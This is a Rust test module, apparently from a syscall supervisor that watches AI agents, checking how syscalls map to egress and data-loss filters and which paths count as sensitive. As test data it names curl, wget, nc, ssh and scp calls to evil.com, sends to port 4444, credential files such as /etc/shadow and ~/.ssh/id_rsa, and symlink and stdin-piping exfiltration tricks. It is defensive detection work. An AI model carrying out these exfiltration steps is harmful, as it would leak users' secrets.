        let kind = SyscallKind::DirList {
            path: "/var/log".into(),
        };
        assert_eq!(
            to_tool_call_type(&kind),
            Some(ToolCallType::DirList {
                path: "/var/log".into()
            })
        );
    }

    // ── Process operations ─────────────────────────────────────────

    #[test]
    fn process_exec_maps_to_process_spawn() {
        let kind = SyscallKind::ProcessExec {
            path: "/usr/bin/git".into(),
            args: vec!["status".into()],
        };
        assert_eq!(
            to_tool_call_type(&kind),
            Some(ToolCallType::ProcessSpawn {
                command: "/usr/bin/git".into(),
                args: vec!["status".into()],
            })
        );
    }

    #[test]
    fn process_fork_is_filtered() {
        let kind = SyscallKind::ProcessFork { child_pid: 12345 };
        assert_eq!(to_tool_call_type(&kind), None);
    }

    // ── Network operations ─────────────────────────────────────────

    #[test]
    fn net_connect_maps_correctly() {
        let kind = SyscallKind::NetConnect {
            address: "api.openai.com".into(),
            port: 443,
            protocol: crate::interceptor::NetProtocol::Tcp,
        };
        assert_eq!(
            to_tool_call_type(&kind),
            Some(ToolCallType::NetConnect {
                address: "api.openai.com".into(),
                port: 443,
            })
        );
    }

    #[test]
    fn net_bind_maps_to_net_listen() {
        let kind = SyscallKind::NetBind {
            sockaddr_ptr: None,
            addrlen: None,
            address: "0.0.0.0".into(),
            port: 8080,
            protocol: crate::interceptor::NetProtocol::Tcp,
        };
        assert_eq!(
            to_tool_call_type(&kind),
            Some(ToolCallType::NetListen {
                address: "0.0.0.0".into(),
                port: 8080,
            })
        );
    }

    /// Was `net_send_to_is_filtered`, which asserted that a datagram send to
    /// an explicit remote destination was noise. That is the go-live review
    /// B13 hole: it let `sendto(fd, secret, ..., &attacker_addr, ...)` egress
    /// with no evaluation and no audit record. A send to a real host — even a
    /// LAN resolver like this one — is egress and gets scored; the session
    /// allowlist and a profile's `routine_destinations` keep it from
    /// re-prompting.
    #[test]
    fn net_send_to_explicit_destination_is_scored() {
        let kind = SyscallKind::NetSendTo {
            address: "10.0.0.1".into(),
            port: 53,
        };
        assert_eq!(
            to_tool_call_type(&kind),
            Some(ToolCallType::NetConnect {
                address: "10.0.0.1".into(),
                port: 53,
            })
        );
    }

    #[test]
    fn net_send_to_raw_af_packet_maps_to_net_connect() {
        // AF_PACKET sendto() is classified as NetSendTo { address: "raw:af_packet" }
        // by classify.rs. It must reach the egress filter as NetConnect.
        let kind = SyscallKind::NetSendTo {
            address: "raw:af_packet".into(),
            port: 0,
        };
        assert_eq!(
            to_tool_call_type(&kind),
            Some(ToolCallType::NetConnect {
                address: "raw:af_packet".into(),
                port: 0,
            }),
            "raw:af_packet sendto must be mapped to NetConnect for proxy evaluation"
        );
    }

    #[test]
    fn pipe_create_is_filtered() {
        assert_eq!(to_tool_call_type(&SyscallKind::PipeCreate), None);
    }

    #[test]
    fn socket_pair_is_filtered() {
        assert_eq!(to_tool_call_type(&SyscallKind::SocketPair), None);
    }

    #[test]
    fn raw_socket_create_is_filtered() {
        // RawSocketCreate is hard-denied in event_handler before reaching
        // to_tool_call_type, but the explicit None arm must still be present
        // (and return None) for exhaustiveness and to document the invariant.
        let kind = SyscallKind::RawSocketCreate {
            domain: 17, // AF_PACKET
            socket_type: 3,
            protocol: 0,
        };
        assert_eq!(to_tool_call_type(&kind), None);
    }

    // ── Noise filtering ────────────────────────────────────────────

    #[test]
    fn proc_paths_are_noise() {
        assert!(is_noise_path("/proc/self/status"));
        assert!(is_noise_path("/proc/1234/maps"));
    }

    // Protection suite (research doc §5.1 #1): another process's environment or
    // memory leaks its secrets and must NOT be noise-exempt; the caller's own
    // /proc/self/* stays exempt.
    #[test]
    fn cross_process_environ_and_mem_are_not_noise() {
        assert!(is_cross_process_secret_proc_path("/proc/1234/environ"));
        assert!(is_cross_process_secret_proc_path("/proc/1234/mem"));
        assert!(!is_noise_path("/proc/1234/environ"));
        assert!(!is_noise_path("/proc/1234/mem"));
        // Own environment/memory + other /proc entries stay exempt.
        assert!(!is_cross_process_secret_proc_path("/proc/self/environ"));
        assert!(!is_cross_process_secret_proc_path("/proc/thread-self/mem"));
        assert!(!is_cross_process_secret_proc_path("/proc/1234/status"));
        assert!(is_noise_path("/proc/self/environ"));
        assert!(is_noise_path("/proc/1234/status"));
        assert!(is_noise_path("/proc/1234/maps"));
    }

    #[test]
    fn sys_paths_are_noise() {
        assert!(is_noise_path("/sys/class/net/eth0"));
    }

    #[test]
    fn dev_null_is_noise() {
        assert!(is_noise_path("/dev/null"));
    }

    #[test]
    fn dev_urandom_is_noise() {
        assert!(is_noise_path("/dev/urandom"));
        assert!(is_noise_path("/dev/random"));
    }

    #[test]
    fn dev_tty_is_noise() {
        assert!(is_noise_path("/dev/tty"));
    }

    #[test]
    fn dev_fd_and_stdio_are_noise() {
        // Process-local FD references — the originating openat is what gets
        // policy-checked, so these aliases add no authority.
        assert!(is_noise_path("/dev/fd/0"));
        assert!(is_noise_path("/dev/fd/6"));
        assert!(is_noise_path("/dev/fd/255"));
        assert!(is_noise_path("/dev/stdin"));
        assert!(is_noise_path("/dev/stdout"));
        assert!(is_noise_path("/dev/stderr"));
    }

    #[test]
    fn dev_fd_lookalikes_are_not_noise() {
        // Guard against the prefix accidentally matching a real path. There
        // is no real /dev/fdsomething or /dev/stdinX device, but we want the
        // matcher to be exact so a future addition doesn't widen the surface
        // by accident.
        assert!(!is_noise_path("/dev/fdsomething"));
        assert!(!is_noise_path("/dev/stdinjector"));
    }

    #[test]
    fn pyc_files_are_noise() {
        assert!(is_noise_path("/usr/lib/python3.11/importlib/__init__.pyc"));
    }

    #[test]
    fn pycache_dirs_are_noise() {
        assert!(is_noise_path(
            "/home/user/project/__pycache__/module.cpython-311"
        ));
    }

    #[test]
    fn hidden_tmp_files_are_noise() {
        assert!(is_noise_path("/tmp/.X11-lock"));
        assert!(is_noise_path("/tmp/.font-unix"));
    }

    #[test]
    fn regular_paths_are_not_noise() {
        assert!(!is_noise_path("/home/user/.ssh/id_rsa"));
        // /etc/passwd is noise (world-readable user database)
        assert!(is_noise_path("/etc/passwd"));
        assert!(!is_noise_path("/tmp/output.txt"));
        assert!(!is_noise_path("/var/log/syslog"));
        assert!(!is_noise_path("/usr/bin/python3"));
    }

    #[test]
    fn dev_pts_is_noise() {
        assert!(is_noise_path("/dev/pts/0"));
        assert!(is_noise_path("/dev/pts/29"));
    }

    #[test]
    fn dev_paths_that_are_not_noise() {
        // /dev/sda is not in the noise list
        assert!(!is_noise_path("/dev/sda1"));
    }

    // ── Exfiltration sink coverage validation ─────────────────────
    //
    // These tests validate that all outbound "sink" syscall types that
    // could be used for data exfiltration are properly mapped to
    // ToolCallType variants that the egress/DLP/containment filters
    // can evaluate.

    #[test]
    fn sink_net_connect_is_mapped() {
        // NetConnect is the primary network exfiltration sink.
        let kind = SyscallKind::NetConnect {
            address: "evil.example.com".into(),
            port: 443,
            protocol: crate::interceptor::NetProtocol::Tcp,
        };
        let result = to_tool_call_type(&kind);
        assert!(
            result.is_some(),
            "NetConnect must be mapped for egress filter evaluation"
        );
        assert!(matches!(result, Some(ToolCallType::NetConnect { .. })));
    }

    #[test]
    fn sink_process_exec_curl_is_mapped() {
        // ProcessExec of curl/wget/nc is a shell-transport exfiltration vector.
        for cmd in &[
            "/usr/bin/curl",
            "/usr/bin/wget",
            "/usr/bin/nc",
            "/usr/bin/ssh",
            "/usr/bin/scp",
        ] {
            let kind = SyscallKind::ProcessExec {
                path: (*cmd).to_string(),
                args: vec!["https://evil.com".into()],
            };
            let result = to_tool_call_type(&kind);
            assert!(
                result.is_some(),
                "{cmd} must be mapped for command filter evaluation"
            );
            assert!(matches!(result, Some(ToolCallType::ProcessSpawn { .. })));
        }
    }

    #[test]
    fn sink_file_write_to_socket_path_is_mapped() {
        // FileWrite with a resolved path is mapped for DLP scanning.
        let kind = SyscallKind::FileWrite {
            fd: 5,
            path: Some("/tmp/exfil_data.txt".into()),
        };
        let result = to_tool_call_type(&kind);
        assert!(
            result.is_some(),
            "FileWrite with path must be mapped for DLP scanning"
        );
    }

    #[test]
    fn sink_net_bind_is_mapped() {
        // NetBind (server listen) could be used for reverse-shell exfiltration.
        let kind = SyscallKind::NetBind {
            sockaddr_ptr: None,
            addrlen: None,
            address: "0.0.0.0".into(),
            port: 4444,
            protocol: crate::interceptor::NetProtocol::Tcp,
        };
        let result = to_tool_call_type(&kind);
        assert!(
            result.is_some(),
            "NetBind must be mapped to detect reverse shells"
        );
    }

    #[test]
    fn source_sensitive_file_reads_are_mapped() {
        // Sensitive file reads (sources) must be mapped for containment tracking.
        for path in &[
            "/etc/shadow",
            "/home/user/.ssh/id_rsa",
            "/home/user/.aws/credentials",
            "/home/user/.env",
        ] {
            let kind = SyscallKind::FileOpen {
                path: (*path).to_string(),
                flags: OpenFlags::ReadOnly,
            };
            let result = to_tool_call_type(&kind);
            assert!(
                result.is_some(),
                "{path} read must be mapped for containment arming"
            );
            assert!(
                !is_noise_path(path),
                "{path} must not be classified as noise"
            );
        }
    }

    #[test]
    fn platform_sink_coverage_matrix() {
        // Validates the completeness of the sink mapping for exfiltration detection.
        //
        // Platform compatibility matrix (v1.6):
        //
        // | Sink Type         | Linux (ptrace)  | macOS (fallback) | Windows (v2.0) |
        // |-------------------|-----------------|------------------|----------------|
        // | NetConnect        | Full            | Not intercepted  | Deferred       |
        // | NetBind/Listen    | Full            | Not intercepted  | Deferred       |
        // | ProcessSpawn      | Full            | Synthetic only   | Deferred       |
        // | FileWrite (path)  | Full            | Not intercepted  | Deferred       |
        // | FileRead (path)   | Full            | Not intercepted  | Deferred       |
        // | FileDelete        | Full            | Not intercepted  | Deferred       |
        // | FileRename        | Full            | Not intercepted  | Deferred       |
        // | FileChmod         | Full            | Not intercepted  | Deferred       |
        // | DirCreate         | Full            | Not intercepted  | Deferred       |
        // | DirList           | Full            | Not intercepted  | Deferred       |
        //
        // Noise-filtered (not sent to proxy):
        //   ProcessFork, NetSendTo, PipeCreate, SocketPair, fd read/write without path
        //
        // Known limitations:
        //   - Linux: x86_64 and aarch64 (per-arch syscall tables + register
        //     access live behind platform/linux/arch/; classification and
        //     this map are arch-neutral via SysId)
        //   - macOS: Fallback mode only generates synthetic ProcessExec events
        //     Real syscall interception requires Endpoint Security entitlement (v2.0)
        //   - Windows: No supervisor implementation (Minifilter + ETW deferred to v2.0)
        //   - Pipe data content: Not inspectable (data flows through fd, not syscall args)
        //   - stdin piping: e.g. `cat secret | curl -d @-` — the file content is invisible

        // Verify all exfiltration-relevant sinks produce Some(ToolCallType)
        let sinks: Vec<SyscallKind> = vec![
            SyscallKind::NetConnect {
                address: "1.2.3.4".into(),
                port: 80,
                protocol: crate::interceptor::NetProtocol::Tcp,
            },
            SyscallKind::NetBind {
                sockaddr_ptr: None,
                addrlen: None,
                address: "0.0.0.0".into(),
                port: 8080,
                protocol: crate::interceptor::NetProtocol::Tcp,
            },
            SyscallKind::ProcessExec {
                path: "/usr/bin/curl".into(),
                args: vec!["https://example.com".into()],
            },
            SyscallKind::FileWrite {
                fd: 3,
                path: Some("/tmp/output".into()),
            },
        ];
        for sink in &sinks {
            assert!(
                to_tool_call_type(sink).is_some(),
                "Exfiltration sink {sink:?} must be mapped to a ToolCallType"
            );
        }
    }

    // ── Sensitive path detection ──────────────────────────────────

    #[test]
    fn ssh_keys_are_sensitive() {
        assert!(is_sensitive_path("/home/user/.ssh/id_rsa"));
        assert!(is_sensitive_path("/home/user/.ssh/id_ed25519"));
        assert!(is_sensitive_path("/home/user/.ssh/config"));
    }

    #[test]
    fn aws_credentials_are_sensitive() {
        assert!(is_sensitive_path("/home/user/.aws/credentials"));
        assert!(is_sensitive_path("/home/user/.aws/config"));
    }

    #[test]
    fn gnupg_is_sensitive() {
        assert!(is_sensitive_path("/home/user/.gnupg/secring.gpg"));
    }

    #[test]
    fn kube_config_is_sensitive() {
        assert!(is_sensitive_path("/home/user/.kube/config"));
    }

    #[test]
    fn env_files_are_sensitive() {
        assert!(is_sensitive_path("/workspace/.env"));
        assert!(is_sensitive_path("/workspace/.env.production"));
    }

    /// work/80: the strong credential-store core — what `${PROJECT_DIR}`-
    /// derived session trust must NEVER cover — versus the weaker name-based
    /// signals that project trust may still noise-allow inside a real
    /// project tree.
    /// work/83 review finding 2: project-derived trust short-circuited every
    /// in-project secret whose name is not a credential STORE. The guarded set
    /// is widened to the files whose CONTENT is the secret — measured at the
    /// proxy on a read: `config/master.key` 8.00, `.env`/`.env.local` 6.00,
    /// `terraform.tfstate` 4.00, `certs/client.p12` 4.00.
    ///
    /// It is NOT widened to `is_sensitive_path`. Every path in the second
    /// list is one work/80 deliberately left covered, and the measurement
    /// behind that decision still holds: all three `*.pem`/`*.key` files in
    /// this workspace are false positives (a public AWS CA bundle and two
    /// vendored TLS test fixtures, 8.00 each), and grith's own
    /// `config/secrets.toml` scores 5.80 on the keyword rule alone.
    /// Every path the guard covers, shared with
    /// [`project_trust_guard_is_a_subset_of_sensitive`] so the two invariants
    /// can never be pinned on different sets.
    const GUARDED_IN_PROJECT_SECRETS: &[&str] = &[
        "/home/u/proj/.env",
        "/home/u/proj/.env.local",
        "/home/u/proj/.env.production",
        "/home/u/proj/config/master.key",
        "/home/u/proj/terraform.tfstate",
        "/home/u/proj/terraform.tfstate.backup",
        "/home/u/proj/certs/client.p12",
        "/home/u/proj/certs/bundle.PFX",
    ];

    #[test]
    fn project_trust_guard_covers_in_project_secrets_only() {
        for p in GUARDED_IN_PROJECT_SECRETS.iter().copied() {
            assert!(
                is_high_value_project_secret(p),
                "{p} must be guarded against project trust"
            );
            assert!(is_project_trust_guarded_path(p));
            assert!(
                !is_credential_store_path(p),
                "{p} is an in-project secret, not a credential store — the two \
                 sets stay distinct so work/80's other callers are unaffected"
            );
        }

        for p in [
            // Committed templates hold placeholders; the proxy scores them
            // 0.00, so guarding them would cost an evaluation per read and
            // never a prompt.
            "/home/u/proj/.env.example",
            "/home/u/proj/.env.sample",
            "/home/u/proj/.env.template",
            // The weak name signals work/80 left to project trust.
            "/home/u/proj/tls/server.pem",
            "/home/u/proj/deploy.key",
            "/home/u/proj/config/secrets.toml",
            "/home/u/proj/src/auth/token_store.rs",
            "/home/u/proj/src/main.rs",
        ] {
            assert!(
                !is_high_value_project_secret(p),
                "{p} must stay covered by project trust"
            );
        }
    }

    /// The guarded set must be a SUBSET of the sensitive set, over the whole
    /// list rather than a hand-picked sample.
    ///
    /// The `ignore_read_only` fast path in `event_handler` reads
    /// `if !is_sensitive_path(path) || session_trusted || !file_exists` — the
    /// first clause returns BEFORE the project-trust guard on `session_trusted`
    /// is consulted, so a path this guard covers but `is_sensitive_path` does
    /// not is auto-allowed on a read and the guard is dead. `*.tfstate` was
    /// exactly that: guarded by work/83's finding-2 fix, not sensitive, and so
    /// still served by the fast path with `total_queued: 0`. Pinned as a
    /// property so the next addition to `is_high_value_project_secret` cannot
    /// repeat it.
    #[test]
    fn project_trust_guard_is_a_subset_of_sensitive() {
        for p in GUARDED_IN_PROJECT_SECRETS.iter().copied() {
            assert!(
                is_sensitive_path(p),
                "{p} is guarded against project trust but not sensitive — the \
                 read-only fast path would auto-allow it before the guard runs"
            );
        }
    }

    #[test]
    fn credential_store_core_is_narrower_than_sensitive() {
        // Strong: stores.
        for p in [
            "/home/u/.ssh/grith_canary_key",
            "/home/u/.aws/credentials",
            "/home/u/.gnupg/secring.gpg",
            "/home/u/.kube/config",
            "/etc/shadow",
            "/home/u/.config/grith/config.toml",
            "/proc/123/environ",
        ] {
            assert!(
                is_credential_store_path(p),
                "{p} must be a credential store"
            );
            assert!(is_sensitive_path(p), "{p} must also be sensitive");
        }
        // Weak: sensitive, but NOT stores — everyday files inside projects.
        for p in [
            "/home/u/proj/.env",
            "/home/u/proj/tls/server.pem",
            "/home/u/proj/deploy.key",
            "/home/u/proj/apikey_config.yaml",
        ] {
            assert!(is_sensitive_path(p), "{p} must be sensitive");
            assert!(
                !is_credential_store_path(p),
                "{p} must NOT be a credential store (project trust may cover it)"
            );
        }
        // Review defect 2: the credential DIRECTORY itself is a store.
        for d in ["/home/u/proj/.aws", "/home/u/proj/.ssh", "/home/u/.gnupg"] {
            assert!(is_credential_store_path(d), "dir {d} must be a store");
        }
        // Review defect 4: near-zero-FP credential FILES are stores too.
        for p in [
            "/home/u/proj/.npmrc",
            "/home/u/proj/.netrc",
            "/home/u/proj/.git-credentials",
            "/home/u/proj/id_rsa",
        ] {
            assert!(is_credential_store_path(p), "{p} must be a store");
        }
        // Plainly boring paths are neither.
        assert!(!is_credential_store_path("/home/u/proj/src/main.rs"));
        // ...and a directory that merely CONTAINS ".aws" as a substring of a
        // longer component is not a store (word-boundary via trailing slash).
        assert!(!is_credential_store_path("/home/u/proj/.awsome/notes.txt"));
    }

    #[test]
    fn system_credential_files_are_sensitive() {
        assert!(is_sensitive_path("/etc/shadow"));
        // /etc/passwd is world-readable, not sensitive
        assert!(!is_sensitive_path("/etc/passwd"));
        assert!(is_sensitive_path("/etc/sudoers"));
    }

    /// work/83 T6: the supervisor's noise gate and the proxy's scoring rule
    /// now share `grith_proxy::paths`, so a name that stops being scored also
    /// stops blocking read-only noise suppression — and vice versa.
    #[test]
    fn keyword_gate_is_token_based_but_never_borrows_a_score_suppression() {
        // Coincidental substrings no longer hold a read out of noise
        // suppression. Each of these produced modal prompts (work/83 §2.2).
        // Note every one is a TOKEN miss, not a location or extension
        // carveout — this gate decides visibility, so it may only narrow on
        // "the name is not credential-ish".
        for p in [
            "/p/web/public/hero-zero-ambient-authority-1600x900.svg",
            "/p/target/debug/incremental/773v9mxq3ohs6twiwt1rzauth.o",
            "/p/node_modules/acorn/dist/tokenizer.js",
            "/p/AUTHORS",
        ] {
            assert!(!is_sensitive_path(p), "{p} must not be name-sensitive");
        }
        // Real credential-shaped names still reach the proxy.
        for p in [
            "/p/auth.json",
            "/p/deploy/secrets.yaml",
            "/p/config/api-token.txt",
            "/p/service-account-credentials.json",
            "/p/bin/with-secrets",
        ] {
            assert!(is_sensitive_path(p), "{p} must stay name-sensitive");
        }
        // The regression this pins: a credential-NAMED read inside a
        // dependency tree, a generated-output tree, or with a documentation /
        // asset extension is still SEEN. The proxy scores it 0.0 — which is
        // what removes the prompt — but the taint filter classifies every one
        // of these as a sensitive source, and a call that is never evaluated
        // registers no taint.
        for p in [
            "/p/target/x/credentials.json",
            "/p/target/debug/build/x/secrets.yaml",
            "/p/gems/token.txt",
            "/p/vendor/x/credentials",
            "/p/notes/credentials.md",
            "/p/notes/api-token.pdf",
            "/p/node_modules/aws-sdk/clients/secrets.json",
            "/p/dist/tokens.json",
        ] {
            assert!(
                is_sensitive_path(p),
                "{p}: a score suppression must not become a visibility suppression"
            );
        }
        // The strong classes are untouched by every carveout: a credential
        // store inside a dependency tree, and key material with an artifact
        // extension, both still reach the proxy.
        for p in [
            "/p/node_modules/evil/.env",
            "/p/node_modules/evil/id_rsa",
            "/p/target/debug/build/x/.npmrc",
            "/home/u/.aws/credentials",
        ] {
            assert!(
                is_sensitive_path(p),
                "{p} must stay sensitive via a strong rule"
            );
        }
    }

    #[test]
    fn key_files_are_sensitive() {
        assert!(is_sensitive_path("/certs/server.pem"));
        assert!(is_sensitive_path("/certs/private.key"));
        assert!(is_sensitive_path("/certs/keystore.p12"));
    }

    #[test]
    fn secret_filenames_are_sensitive() {
        assert!(is_sensitive_path("/config/secret.yaml"));
        assert!(is_sensitive_path("/config/credentials.json"));
        assert!(is_sensitive_path("/config/apikey.txt"));
    }

    #[test]
    fn regular_source_files_are_not_sensitive() {
        assert!(!is_sensitive_path("/workspace/src/main.rs"));
        assert!(!is_sensitive_path("/workspace/package.json"));
        assert!(!is_sensitive_path("/tmp/output.txt"));
        assert!(!is_sensitive_path("/var/log/syslog"));
        assert!(!is_sensitive_path("/usr/share/doc/README"));
    }

    /// Source files whose NAME contains a credential-ish word (`AccessToken.php`,
    /// `RefreshToken.ts`, `OAuth2Client.java`) are code modules, not credential
    /// stores. They must NOT be flagged — otherwise an AI assistant reading a
    /// vendored OAuth/SDK library floods the operator with prompts.
    #[test]
    fn source_files_with_credential_words_in_name_are_not_sensitive() {
        for p in [
            "/proj/vendor/league/oauth2-client/src/Token/AccessToken.php",
            "/proj/vendor/xeroapi/xero-php-oauth2/lib/Models/Identity/RefreshToken.php",
            "/proj/mercury_html/docs/FPDI-2.6.0/src/PdfParser/Tokenizer.php",
            "/proj/src/auth/OAuth2Client.ts",
            "/proj/internal/token/Token.go",
            "/proj/app/Secrets.java",
            "/proj/lib/credentials.rb",
        ] {
            assert!(
                !is_sensitive_path(p),
                "source file should not be sensitive: {p}"
            );
        }
    }

    /// The carveout is extension-scoped: credential-ish NON-source files (data,
    /// config, plain names) stay sensitive.
    #[test]
    fn non_source_credential_files_stay_sensitive_after_carveout() {
        assert!(is_sensitive_path("/proj/api_token")); // no extension
        assert!(is_sensitive_path("/proj/token.txt"));
        assert!(is_sensitive_path("/proj/secrets.json"));
        assert!(is_sensitive_path("/proj/credentials.yaml"));
        assert!(is_sensitive_path("/proj/get_token.sh")); // scripts can hold real secrets
    }

    /// PR 69 Change 5: substring-token rule must not fire on legitimate
    /// npm dependency filenames inside `node_modules/`. These were the
    /// exact paths queued during the codex audit (session 7f256630-…).
    #[test]
    fn node_modules_tokenish_files_are_not_sensitive() {
        assert!(!is_sensitive_path(
            "/home/u/.nvm/versions/node/v22.22.2/lib/node_modules/npm/node_modules/postcss-selector-parser/dist/tokenize.js"
        ));
        assert!(!is_sensitive_path(
            "/home/u/proj/node_modules/some-lib/dist/tokenTypes.js"
        ));
        assert!(!is_sensitive_path(
            "/home/u/proj/node_modules/some-lib/auth-helper.js"
        ));
    }

    /// PR 69 Change 5: other sensitive-path rules still fire on paths
    /// that happen to be inside `node_modules/`. Only the substring-
    /// token rule is suppressed.
    #[test]
    fn node_modules_still_protects_keys_and_env_files() {
        // Key file inside node_modules should still match.
        assert!(is_sensitive_path("/home/u/proj/node_modules/x/id_rsa"));
        assert!(is_sensitive_path("/home/u/proj/node_modules/x/foo.pem"));
        // .env inside node_modules should still match.
        assert!(is_sensitive_path("/home/u/proj/node_modules/x/.env"));
    }

    /// PR 69 Change 5: a path with a decoy `node_modules_*` substring
    /// (NOT an actual `/node_modules/` path component) does not inherit
    /// the carveout — the substring-token rule still fires. The
    /// supervisor's substring set is {secret, credential, token,
    /// apikey}, so the filename here uses "token".
    #[test]
    fn node_modules_decoy_substring_does_not_grant_carveout() {
        assert!(is_sensitive_path(
            "/home/u/proj/node_modules_decoy/auth-token.txt"
        ));
    }

    // ── B2: link creation maps to FileLink, scored by target ──────────

    #[test]
    fn symlink_maps_to_file_link_preserving_direction() {
        let kind = SyscallKind::FileLink {
            target: "/home/u/.ssh/id_rsa".into(),
            link_path: "/tmp/notes.txt".into(),
            symbolic: true,
        };
        assert_eq!(
            to_tool_call_type(&kind),
            Some(ToolCallType::FileLink {
                target: "/home/u/.ssh/id_rsa".into(),
                link_path: "/tmp/notes.txt".into(),
                symbolic: true,
            })
        );
    }

    #[test]
    fn hard_link_maps_to_file_link_with_symbolic_false() {
        let kind = SyscallKind::FileLink {
            target: "/etc/shadow".into(),
            link_path: "/tmp/s".into(),
            symbolic: false,
        };
        match to_tool_call_type(&kind) {
            Some(ToolCallType::FileLink { symbolic, .. }) => assert!(!symbolic),
            other => panic!("expected FileLink, got {other:?}"),
        }
    }

    /// The whole point of the variant: path-based filters must see what the
    /// link exposes, not the innocuous name it is exposed under. If this
    /// ever returns the link path, `ln -s ~/.ssh/id_rsa /tmp/x` scores as a
    /// write to `/tmp/x` and the laundering is invisible again.
    #[test]
    fn file_link_context_path_is_the_target() {
        let call = to_tool_call_type(&SyscallKind::FileLink {
            target: "/home/u/.ssh/id_rsa".into(),
            link_path: "/tmp/notes.txt".into(),
            symbolic: true,
        })
        .expect("link must map to a tool call type");
        let ctx = grith_proxy::types::ToolCallContext::new(
            "supervisor".to_string(),
            call,
            uuid::Uuid::new_v4(),
        );
        assert_eq!(ctx.path(), Some("/home/u/.ssh/id_rsa"));
    }
}
#[cfg(test)]
mod b13_sendto_tests {
    use super::*;

    /// The exfiltration path: an explicit destination on an unconnected
    /// datagram socket must reach the egress filters.
    #[test]
    fn explicit_remote_sendto_is_scored_as_egress() {
        let kind = SyscallKind::NetSendTo {
            address: "203.0.113.7".into(),
            port: 4444,
        };
        assert_eq!(
            to_tool_call_type(&kind),
            Some(ToolCallType::NetConnect {
                address: "203.0.113.7".into(),
                port: 4444,
            }),
            "sendto to an arbitrary remote host must be evaluated, not treated as noise"
        );
    }

    #[test]
    fn ipv6_remote_sendto_is_scored() {
        let kind = SyscallKind::NetSendTo {
            address: "2001:db8::1".into(),
            port: 53,
        };
        assert!(to_tool_call_type(&kind).is_some());
    }

    /// A connected send carries no explicit destination; the connected-peer
    /// path surfaces it before classification, so scoring it here would
    /// double-count.
    #[test]
    fn connected_send_without_destination_stays_noise() {
        let kind = SyscallKind::NetSendTo {
            address: String::new(),
            port: 0,
        };
        assert_eq!(to_tool_call_type(&kind), None);
    }

    /// FP guards: routine local and discovery traffic must not prompt.
    #[test]
    fn local_and_discovery_destinations_stay_noise() {
        for (address, port) in [
            ("127.0.0.53", 53u16),     // systemd-resolved
            ("127.0.0.1", 8080),       // local service
            ("::1", 53),               // loopback v6
            ("0.0.0.0", 0),            // unspecified
            ("224.0.0.251", 5353),     // mDNS
            ("224.0.0.252", 5355),     // LLMNR
            ("ff02::fb", 5353),        // mDNS v6
            ("239.255.255.250", 1900), // SSDP
            ("255.255.255.255", 67),   // DHCP broadcast
            ("::ffff:127.0.0.1", 53),  // IPv4-mapped loopback
        ] {
            let kind = SyscallKind::NetSendTo {
                address: address.into(),
                port,
            };
            assert_eq!(
                to_tool_call_type(&kind),
                None,
                "{address}:{port} is routine local traffic and must not prompt"
            );
        }
    }

    /// Routable multicast is not link-local and can leave the segment.
    #[test]
    fn routable_multicast_is_scored() {
        let kind = SyscallKind::NetSendTo {
            address: "233.252.0.1".into(),
            port: 9999,
        };
        assert!(to_tool_call_type(&kind).is_some());
    }

    #[test]
    fn unix_datagram_sends_stay_noise() {
        for address in ["unix:/run/user/1000/bus", "/tmp/sock"] {
            let kind = SyscallKind::NetSendTo {
                address: address.into(),
                port: 0,
            };
            assert_eq!(to_tool_call_type(&kind), None);
        }
    }
}
